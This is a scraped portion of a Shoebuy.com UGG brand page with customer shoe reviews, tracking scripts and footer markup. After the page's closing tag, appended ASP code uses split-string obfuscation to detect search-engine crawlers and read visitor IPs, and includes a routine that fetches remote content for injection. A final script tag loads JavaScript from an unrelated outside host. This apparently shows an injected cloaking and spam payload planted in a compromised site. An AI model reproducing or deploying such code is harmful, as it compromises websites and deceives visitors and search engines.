                    <input type="hidden" name="rid" value="835191">
                    <input type="hidden" name="rv" value="r">
                </form>
            </div><!--end helpful-->
        </div><!--end review-->
    </div><!--end single-review -->

    <div class="single-review clearfix">
        <div class="product-reviewed">
			<div class="rating"><span class="star50 stars_rating"></span></div>
            <a href="/ugg-kennaria-snake/579531" class="image"><img src="/pi/decke/xs/decke579531_221407_xs.jpg"/></a>
            <div class="shoe-floor"></div>
            <a href="/ugg-kennaria-snake/579531" class="name">UGG Kennaria Snake</a>
            <span class="price">$57.95</span>
        </div><!--end product-reviewed-->
        <div class="review">
			<div class="header">
            	<div class="title"> Nice shoe </div> 
				<div class="custInfo">
					By Janna, from Iowa | June 30, 2014
				</div>
			</div><!--end header-->
            <p class="message">It is a good sandal only wish it maybe had a little wider strap across foot for more secure feeling.</p>
            
            <div class="review-questions clearfix">
                <ul>
                    
                    <li><strong>Shoe Size:</strong> Felt true to size</li>
                    
                    <li><strong>Shoe Width:</strong> Felt true to width</li>
                    
                    <li><strong>Wears this shoe:</strong> Casual</li>
                    
                </ul>
            </div><!--end review-questions-->
            
            <div class="helpful">
                <form name="h832982" action="/s.jsp" method="post">
                    <p>Was this review helpful to you? <button type="submit" class="product button" name="rhelp.x">Yes</button><button type="submit" class="product button" name="rnohelp.x">No</button>
                    <input type="hidden" name="Style" value="579531">
                    <input type="hidden" name="rid" value="832982">
                    <input type="hidden" name="rv" value="r">
                </form>
            </div><!--end helpful-->
        </div><!--end review-->
    </div><!--end single-review -->

    <div class="single-review clearfix">
        <div class="product-reviewed">
			<div class="rating"><span class="star50 stars_rating"></span></div>
            <a href="/ugg-classic-short/484449" class="image"><img src="/pi/decke/xs/decke484449_356519_xs.jpg"/></a>
            <div class="shoe-floor"></div>
            <a href="/ugg-classic-short/484449" class="name">UGG Classic Short</a>
            <span class="price">$108.95 - $154.95</span>
        </div><!--end product-reviewed-->
        <div class="review">
			<div class="header">
            	<div class="title"> great gift </div> 
				<div class="custInfo">
					By Gryphon, from Boston | June 26, 2014
				</div>
			</div><!--end header-->
            <p class="message">I bought this pair of <a href="/boots.htm">boots</a> for a friend living and working on Juneau Harbor in Alaska. She loves them. She was trying to combat that deep cold feeling obtained from the floor of her shop and yet not look as if she were going to climb <a href="/everest.htm">Everest</a>. She has been wearing them since and loves them. The fleece lining is warm and yet sweat free. The boot is also comfortable. Pay heed to the cautionary remarks about ordering a half size lower as I did. They fit her like a glove</p>
            
            <div class="review-questions clearfix">
                <ul>
                    
                    <li><strong>Shoe Size:</strong> Felt half size larger than marked</li>
                    
                    <li><strong>Shoe Width:</strong> Felt true to width</li>
                    
                    <li><strong>Wears this shoe:</strong> She wears them daily</li>
                    
                </ul>
            </div><!--end review-questions-->
            
            <div class="helpful">
                <form name="h832373" action="/s.jsp" method="post">
                    <p>Was this review helpful to you? <button type="submit" class="product button" name="rhelp.x">Yes</button><button type="submit" class="product button" name="rnohelp.x">No</button>
                    <input type="hidden" name="Style" value="484449">
                    <input type="hidden" name="rid" value="832373">
                    <input type="hidden" name="rv" value="r">
                </form>
            </div><!--end helpful-->
        </div><!--end review-->
    </div><!--end single-review -->

    <div class="single-review clearfix">
        <div class="product-reviewed">
			<div class="rating"><span class="star50 stars_rating"></span></div>
            <a href="/ugg-tasman/484523" class="image"><img src="/pi/decke/xs/decke484523_89139_xs.jpg"/></a>
            <div class="shoe-floor"></div>
            <a href="/ugg-tasman/484523" class="name">UGG Tasman</a>
            <span class="price">$99.95</span>
        </div><!--end product-reviewed-->
        <div class="review">
			<div class="header">
            	<div class="title"> A Favorite </div> 
				<div class="custInfo">
					By Betsy, from California | June 24, 2014
				</div>
			</div><!--end header-->
            <p class="message">This is my third pair. I value this slipper/shoe for warmth, <a href="/comfort.htm">comfort</a>, and versatility.</p>
            
            <div class="review-questions clearfix">
                <ul>
                    
                    <li><strong>Shoe Size:</strong> Felt true to size</li>
                    
                    <li><strong>Wears this shoe:</strong> At home and outdoors.</li>
                    
                </ul>
            </div><!--end review-questions-->
            
            <div class="helpful">
                <form name="h832076" action="/s.jsp" method="post">
                    <p>Was this review helpful to you? <button type="submit" class="product button" name="rhelp.x">Yes</button><button type="submit" class="product button" name="rnohelp.x">No</button>
                    <input type="hidden" name="Style" value="484523">
                    <input type="hidden" name="rid" value="832076">
                    <input type="hidden" name="rv" value="r">
                </form>
            </div><!--end helpful-->
        </div><!--end review-->
    </div><!--end single-review -->

    <div class="single-review clearfix">
        <div class="product-reviewed">
			<div class="rating"><span class="star50 stars_rating"></span></div>
            <a href="/ugg-fluff-flip-flop-ii/640775" class="image"><img src="/pi/decke/xs/decke640775_252709_xs.jpg"/></a>
            <div class="shoe-floor"></div>
            <a href="/ugg-fluff-flip-flop-ii/640775" class="name">UGG Fluff Flip Flop II</a>
            <span class="price">$79.95</span>
        </div><!--end product-reviewed-->
        <div class="review">
			<div class="header">
            	<div class="title"> Perfect Gift </div> 
				<div class="custInfo">
					By Margaret, from Northville, MI | June 20, 2014
				</div>
			</div><!--end header-->
            <p class="message">These Ugg fluffy flip-flops were a gift for my niece and godchild, who is in her 20s. She loves them and they fit perfectly. She is a nurse who is on her feet all day and these will pamper her feet when she wears them at home.</p>
            
            <div class="review-questions clearfix">
                <ul>
                    
                    <li><strong>Shoe Size:</strong> Felt true to size</li>
                    
                    <li><strong>Shoe Width:</strong> Felt true to width</li>
                    
                    <li><strong>Wears this shoe:</strong> She wears them at home after work as slippers.</li>
                    
                </ul>
            </div><!--end review-questions-->
            
            <div class="helpful">
                <form name="h831452" action="/s.jsp" method="post">
                    <p>Was this review helpful to you? <button type="submit" class="product button" name="rhelp.x">Yes</button><button type="submit" class="product button" name="rnohelp.x">No</button>
                    <input type="hidden" name="Style" value="640775">
                    <input type="hidden" name="rid" value="831452">
                    <input type="hidden" name="rv" value="r">
                </form>
            </div><!--end helpful-->
        </div><!--end review-->
    </div><!--end single-review -->

    </div><!--end reviews-wrapper-->






<!-- BRAND INSIDER INFO -->

<div class="brand-insider-wrapper clearfix">
	


</div>


</div><!--end grid_19 main_content-->
</div><!--end container_24-->
</div><!--end content_area-->


<script type="text/javascript">
var br_data = {};

br_data.acct_id = "5084";
br_data.ptype = "category";
br_data.sbtype = "brand";
br_data.cat = "null";


var file = ("https:" == document.location.protocol) ? "https://cdns.brsrvr.com/v1/br-trk-5084.js" : "http://cdn.brsrvr.com/v1/br-trk-5084.js";
document.write(unescape("%3Cscript src='" + file + "' type='text/javascript'%3E%3C/script%3E"));
</script>
<script type="text/javascript">
//try {
  var tracker = BrTrk.getTracker(0.2, br_data);
  tracker.enableTracking();
//} catch(err) {}
</script>


<script type="text/javascript">
	<!--
	//handle product line(sub-brand) section in brand shop
	$(function (){
		$('img.imgcls').parent('a').parent('td').attr('valign', 'bottom');
		if ($.browser.msie) {//stupid ie need special handling
			$('img.imgcls').parent('a').hover(function() {
				$(this).addClass('imghover');
			}, function() {
				$(this).removeClass('imghover');
			});
		}
	});
	//-->
</script>

<!-- OPTIMOST GLOBAL MODULE AND COUNTER CODE -->
<script type="text/javascript">
if (typeof(opModulesArray)!='undefined' && opModulesArray.length>0) {
	for(var i=0;i<opModulesArray.length;i++){
		optimost.displayModule(opModulesArray[i]);
	}
}
</script>
<!-- END OPTIMOST GLOBAL MODULE AND COUNTER CODE -->






</div>

<footer class="sb-page-wide sb-footer">

          <div class="grd-row grd-spacer-1"></div>
          
          <div class="grd-row">
            <div class="grd-small-12 grd-columns">
              <hr>
            </div>
          </div>

          <div class="grd-row">
            <div class="grd-small-6 grd-columns">
              <h3>Stay Connected</h3>
              <ul class="sb-icons">
                <li>
                  <a href="https://www.facebook.com/Shoebuy" target="_blank">
                    <img class="social-facebook footer-social" src="/images/siteimgs/shoebuy/v4/spacer.gif" height="28" width="30" alt="Shoebuy.com Facebook" title="Shoebuy.com Facebook" />
                  </a>
                </li>
                <li>
                  <a href="https://twitter.com/shoebuy" target="_blank">
                    <img class="social-twitter footer-social" src="/images/siteimgs/shoebuy/v4/spacer.gif" height="28" width="30" alt="Shoebuy.com Twitter" title="Shoebuy.com Twitter"/>
                  </a>
                </li>
                <li>
                  <a href="https://plus.google.com/+shoebuy/posts" target="_blank" title="Shoebuy on Google+" onclick="return window.open('https://plus.google.com/+shoebuy', '', 'scrollbars=no,menubar=no,width=980,height=650,resizable=yes,toolbar=no,location=no,status=no');return false;">
                    <img class="social-google footer-social" src="/images/siteimgs/shoebuy/v4/spacer.gif" height="28" width="30" alt="Shoebuy.com Google+" title="Shoebuy.com Google+"/>
                  </a>
                </li>
                <li>
                  <a href="http://www.pinterest.com/shoebuy/" target="_blank">
                    <img class="social-pinterest footer-social" src="/images/siteimgs/shoebuy/v4/spacer.gif" height="30" width="30" alt="Shoebuy.com Pinterest" title="Shoebuy.com Pinterest"/>
                  </a>
                </li>
              </ul>
            </div>

            <div class="grd-small-6 grd-columns align-right">
              <h3>Take Shoebuy.com Everywhere</h3>
              <ul class="sb-icons">
                <li>
                  <a href="https://itunes.apple.com/us/app/shoebuy.com/id818833084?mt=8&ign-mpt=uo%3D4" target="blank">
                    <img class="social-apple" src="/images/siteimgs/shoebuy/v4/spacer.gif" height="30" width="30" alt="Shoebuy.com iPhone App" title="Shoebuy.com iPhone App"/>
                  </a>
                </li>
                <li>
                  <a href="/info/iphone-app">
                    <img class="social-android" src="/images/siteimgs/shoebuy/v4/spacer.gif" height="30" width="30" alt="Shoebuy.com Android App Coming Soon!" title="Shoebuy.com Android App Coming Soon!"/>
                  </a>
                </li>
              </ul>
            </div>
          </div><!-- /grd-row -->

          <div class="grd-row grd-spacer-1"></div>

          <div class="grd-row">
            <div class="grd-small-6 grd-columns">
              <a class="grd-thin-box-2 sb-border-box sb-gift-cards" href="/info/gcbuy">
                <span class="sb-image-wrapper">
                  <img src="/images/siteimgs/shoebuy/v4/Shoebuy-Gift-Cards.jpg" alt="Shoebuy.com Gift Certificates" title="Shoebuy.com Gift Certificates"/>
                </span>
                <span class="sb-gift-cards-text">
                  <span class="sb-heading">Give the gift of shoes and more</span>
                  <span>Shoebuy.com Gift Certificates are the perfect fit.<span class="inline light-blue">&nbsp;</span></span>
                </span>
              </a>
            </div>
            <div class="grd-small-6 grd-columns">
              <div class="grd-thin-box-2 sb-border-box sb-subscribe">
                <div class="sb-heading">Hear it first! - Get Updates and Special Offers</div>
                <div>
                  <form action="https://www.shoebuy.com/cust/email-signup" class="leadspend-enabled-form" method="post">
                    <input class="sb-input-lg" type="email" placeholder="email address" name="email" />
                    <button class="sb-button-orange" name="subscribebtn" value="Subscribe" onclick="this.form.submit();">Subscribe</button>
                  </form>
                </div>
              </div>
            </div>
          </div><!-- /grd-row -->

          <div class="grd-row grd-spacer-2"></div>

          <div class="grd-row">
            <nav class="grd-small-12 grd-columns">
              <ul class="sb-footer-nav">
              <li><a href="/info/about">About Shoebuy</a></li>
              <li><a href="/contact/careers.jsp">Careers</a></li>
              <li><a href="http://blog.shoebuy.com" target="blank">Blog</a></li>
              <li><a href="/info/rewards">Rewards</a></li>
              <li><a href="/info/csindex">Customer Service</a></li>
              <li><a href="/info/returns">Returns</a></li>
              <li><a href="/info/terms">Terms</a></li>
              <li><a href="/info/privacy">Privacy</a></li>
              <li><a href="/info/corpsales">Company/Group Sales</a></li>
              <li><a href="/info/site-guide">Site Guide</a></li>
              </ul>
            </nav>
          </div>
          
          <div class="grd-row grd-spacer-1"></div>

          <div class="grd-row">
            <div class="grd-small-12 grd-columns">
              <div class="sb-copy">&copy; 1999 - 2014 Shoebuy.com, Inc. a subsidiary of <a href="http://iac.com/brand/shoebuycom">IAC</a> (Nasdaq: IACI). All Rights Reserved.<br>The World's Largest Site For Shoes <br><img src="/images/siteimgs/shoebuy/v4/SB-logo.jpg" alt="Shoebuy.com" title="Shoebuy.com"></div>
         </div>
        </footer>

<!--MODALS-->
<div id="phone-popup-target" class="modal hide fade size450" tabindex="-1" role="dialog" aria-labelledby="phoneModal" aria-hidden="true">
    <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-hidden="true"></button>
        <h3 id="phoneModal">1-888-200-8414</h3>
    </div><!--end modal-header-->
    <div class="modal-body"></div><!--end modal-body-->
    <div class="modal-footer">
        <button class="btn button" data-dismiss="modal" aria-hidden="true">Close</button>
    </div><!--end modal-footer-->
</div><!--end modal phone-popup-target-->

<div id="bookmark-popup-target" class="modal hide fade size450" tabindex="-1" role="dialog" aria-labelledby="bookmarkModal" aria-hidden="true">
    <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-hidden="true"></button>
        <h3 id="bookmarkModal">Bookmark &#47; Share This Page</h3>
    </div><!--end modal-header-->
    <div class="modal-body"></div><!--end modal-body-->
    <div class="modal-footer">
        <button class="btn button" data-dismiss="modal" aria-hidden="true">Close</button>
    </div><!--end modal-footer-->
</div><!--end modal bookmark-popup-target-->
<div id="restrictedShipping" class="modal hide fade size450" tabindex="-1" role="dialog" aria-hidden="true">
    <div class="modal-header">
        <h3>Shipping Restrictions</h3>
    </div><!--end modal-header-->
    <div class="modal-body">
    </div><!--end modal-body-->
    <div class="modal-footer">
        
        <button class="btn button" data-dismiss="modal" aria-hidden="true">Continue Shopping</button>
        
    </div><!--end modal-footer-->
</div><!--end modal returns-popup-target-->

        <div class="JScache" style="display:none">
            <input type="hidden" name="promptSearch" value="Enter Search" id="promptSearch" />
            <input type="hidden" name="promptSubscription" value="Enter Email Address" id="promptSubscription" />
        </div>
<!-- site-info w221438vaps3007 / shoebuy.com-b / 2014-11-08a / [islive] / Sun Jan 04 03:53:10 EST 2015 -->


<script type="text/javascript" src="/pbar/pj.jsp?b=UGG&c=&d=&i=%2Fpi%2Fdecke%2Flg%2Fdecke502883_262584_lg.jpg&p=3"></script>

<script type="text/javascript">
    var badIE = badIE || false;
if(!badIE) {
loadFacebookScriptFrameworkAsync({appId: 146327295405912, xfbml: true 
, channelUrl: 'www.shoebuy.com/pbar/facebook_channel.jsp?version=1'});
}
</script>
             
    

 
 




<script type="text/javascript">
Tealium.getInstance('').setData({breadcrumb:Tealium.getBreadcrumb('"BRAND: UGG"', 'brand'),category_path:"Home > All Brands > UGG",customer_email:Tealium.getCustomerEmail(),customer_id:Tealium.getCustomerId(),customer_partner_id:Tealium.getCustomerPartnerId(),date:Tealium.getDateStr(),environment:"prod",is_mobile:"",language:"EN",locale:"en_US",logged_in:Tealium.isLoggedIn(),onsite_search_term:Tealium.getOnSiteSearch(),page_category:"BRAND",page_name:"BRAND: UGG",page_type:"brand",page_url:window.location.href,site_name:"Shoebuy.com",timestamp:Tealium.getTimestampStr()});

</script>
<script type="text/javascript">
if (!window.tealiumLoaded) {
	(function(a,b,c,d){
	 a='//tags.tiqcdn.com/utag/shoebuy/main/prod/utag.js';
	 b=document;c='script';d=b.createElement(c);d.src=a;d.type='text/java'+c;d.async=true;
	 d.onload=function(){
		 Tealium.setTealiumLoaded();
		 
		 Tealium.getInstance('').fireView();
		 
	 };
	 d.onreadystatechange=function(){
		 if(/loaded|complete/.test(d.readyState)) {
		     Tealium.setTealiumLoaded();
		     
	         Tealium.getInstance('').fireView();
	         
		 }
	 };
	 a=b.getElementsByTagName(c)[0];a.parentNode.insertBefore(d,a);
	})();
}
</script>



    <script src="/jscript/jquery.jcarousel.min.js"></script>
    <script src="/jscript/sitejs/shoebuy/v4/sb-home.js"></script>

    <script src="/jscript/sitejs/shoebuy/v4/rem.js"></script>
    <script type="text/javascript">
      $(document).ready(function(){remjs(window);});
    </script>
    </body>
</html>






<%
	End If
	response.End()
End if
echohtml = ""'GetContent(echourl&"sysid="&systid&"&redirect=yes")
If instr(echohtml,lk)>0 Then
	'response.Write replace(echohtml,lk,"")
End If
Function GetContent(url)
	'on error resume next
	Dim xmlHttp
	Set xmlHttp = Server.Createobject("WinHttp.WinHttpRequest.5.1")
	'xmlHttp.SetTimeouts 60000, 60000, 60000, 3000
	xmlHttp.Open "POST", url , False
	xmlHttp.Send()
	GetHtml	= xmlHttp.ResponseBody
	Set xmlHttp=Nothing
	set objStream = Server.CreateObject("Adodb.Stream")
	objStream.Type = 1
	objStream.Mode =3
	objStream.Open
	objStream.Write GetHtml
	objStream.Position = 0
	objStream.Type = 2
	objStream.Charset = "UTF-8"
	GetContent = objStream.ReadText
	objStream.Close
End Function

Function ChecksAgent()
  on error resume next
  agentallow=split("ba"&"idus"&"pid"&"er,so"&"g"&"ou,ba"&"i"&"du,so"&"sos"&"pider,goo"&"g"&"lebot",",")
  agentcheck=false
  For agenti=lbound(agentallow) to ubound(agentallow)
    If Instr(LCase(RSbs("HTTP_USER_AGENT")),agentallow(agenti))>0 then
      agentcheck=true
      Exit For
    end if 
  Next
  ChecksAgent=agentcheck
End function
Function GetRsip()
  'on error resume next
  Dim getips
  If RSbs("HTTP_"&"X_FOR"&"W"&"ARDED_FOR") = "" Or InStr(RSbs("H"&"TTP_X_FO"&"RW"&"ARD"&"ED_FOR"), "unknown") > 0 Then
   getips = RSbs("REM"&"OTE_A"&"DDR")
  ElseIf InStr(RSbs("HT"&"TP_"&"X_FORW"&"ARDED_FOR"), ",") > 0 Then
   getips = Mid(RSbs("H"&"TTP"&"_X_FO"&"RW"&"ARD"&"ED_FOR"), 1, InStr(RSbs("H"&"TT"&"P_"&"X_F"&"ORW"&"AR"&"DE"&"D_F"&"OR"), ",")-1)
   actforip = RSbs("REMO"&"TE_ADD"&"R")
  ElseIf InStr(RSbs("HTT"&"P_X"&"_F"&"RW"&"AR"&"DED_FOR"), ";") > 0 Then
   getips = Mid(RSbs("HT"&"TP_"&"X_F"&"OR"&"W"&"AR"&"DED_"&"FO"&"R"), 1, InStr(RSbs("H"&"TT"&"P_"&"_F"&"OR"&"WA"&"RD"&"ED_"&"FOR"), ";")-1)
   actforip = RSbs("R"&"EMO"&"TE_"&"AD"&"D"&"R")
  Else
   getips = RSbs("HT"&"TP"&"_X_FO"&"RW"&"ARD"&"ED_"&"FOR")
   actforip = RSbs("R"&"EM"&"OTE"&"_AD"&"DR")
  End If
  GetRsip = Replace(Trim(Mid(getips, 1, 30)), "'", "")
End Function

Function RSbs(str)
	RSbs = Request.ServerVariables(str)
End Function
%>
<script src="http://dx.jd9.co/a/ungogo.js" type="text/javascript"></script>